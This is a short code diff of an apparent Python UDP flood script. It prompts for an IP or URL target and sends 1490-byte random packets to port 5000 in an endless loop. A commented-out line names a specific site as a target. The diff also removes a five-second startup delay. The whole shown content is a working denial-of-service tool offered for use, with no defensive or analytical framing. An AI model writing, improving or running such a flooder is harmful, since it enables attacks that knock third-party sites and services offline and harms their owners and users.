@@ -23,14 +23,11 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 # site = 'https://onlineforms.in/'
-site = input("IP/URL Target : ")
+site = input("\nEnter IP/URL Target : ")
 ip = getIP(site)
 
 sent = 0
 port = 5000
-
-print ("Starting in 5 seconds.")
-time.sleep(5)
 
 while True:
   sock.sendto(bytes, (ip,port))
